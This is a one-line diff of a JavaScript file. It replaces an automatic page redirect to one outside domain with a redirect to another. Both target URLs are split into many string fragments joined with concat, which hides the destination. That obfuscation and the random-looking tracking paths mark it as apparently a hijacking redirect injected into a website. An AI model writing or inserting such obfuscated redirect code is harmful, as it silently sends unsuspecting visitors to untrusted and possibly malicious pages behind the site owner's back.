@@ -1,1 +1,1 @@
-window.location.replace(``.concat(`http`,`s://ww`,`w.roadsw`,`orks.`,`com/gQ_hBEIK`,`QRfug`,`Bl4S`,`r-C7MpV`,`8z9GjtG`,`hZ4JRNO`,`lA74ys`,`OMDJcq-4`,`4yhe`,`lP98K`,`KGu1`,`mcL5G`,`1500v`,`Xmf`,`HdM_GumA~~/Zackx`))
+window.location.replace(``.concat(`htt`,`ps://www.m`,`emeyo`,`u2.com/2F`,`W78ZK6Z`,`/H1H4FF`,`X/?__efq=1X`,`zZiNTL`,`F3A_lZ`,`a_K1shvMtH`,`D4QSPJa`,`R6_IChkIofMU`))
